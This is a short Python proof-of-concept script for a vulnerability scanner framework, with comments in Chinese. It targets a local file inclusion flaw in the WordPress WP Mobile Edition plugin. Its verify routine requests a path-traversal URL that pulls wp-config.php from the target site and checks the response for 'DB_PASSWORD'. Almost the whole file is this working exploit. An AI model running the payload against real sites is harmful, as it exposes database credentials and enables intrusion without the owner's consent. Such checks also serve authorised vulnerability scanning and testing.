# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '3d285ef9-409f-41d4-9ec0-802726c0bf44'
    name = 'WordPress WP Mobile Edition 插件本地文件包含漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        WordPress WP Mobile Edition 插件本地文件包含漏洞
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/37244/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress WP Mobile Edition 插件'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'bccea98c-4fc9-4687-949d-c4840281328c'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
            target = '{target}'.format(target=self.target)+payload
            code, head, res, ecode, redirect_url= hh.http(target)
                       
            if code == 200 and 'DB_PASSWORD' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()